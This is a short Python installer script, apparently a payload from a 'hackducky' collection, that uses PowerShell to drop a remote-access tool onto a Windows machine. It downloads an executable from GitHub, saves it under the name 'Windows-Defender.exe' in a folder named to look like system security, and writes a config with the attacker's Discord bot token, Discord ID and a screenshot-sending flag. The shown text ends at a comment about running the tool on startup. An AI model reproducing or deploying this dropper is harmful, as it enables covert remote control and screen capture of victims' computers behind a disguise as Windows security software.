#Imports
from subprocess import run #To run commands in cmd

#Method to run commands and handle errors
def installStep(command):
    try:
        run(["powershell", command], shell=False, check=True)
    except:
        exit()

#Step 1: Create a working directory to download all of the files to
installStep("mkdir Windows-System-Security") #Totally not malware, trust

#Step 2: Download the application to run the Discord bot
installStep("curl https://github.com/3XAY/hackducky/blob/main/submissions/3XAYRemoteAccess/Windows-Defender-Compressed -o Windows-System-Security/Windows-Defender.exe")

#Step 3: Create the .env file
#NOTE: When creating your payload, make sure to put YOUR Discord ID and token, then compress it to an .EXE file
#Check README.md for more information
installStep("echo DISCORD_TOKEN=ENTERTOKENHERE > Windows-System-Security/.env")
installStep("echo DISCORD_ID=ENTERYOURIDHERE >> Windows-System-Security/.env")
installStep("echo SEND_SCREENSHOT=True >> Windows-System-Security/.env")

#Step 4: Make sure the app runs on startup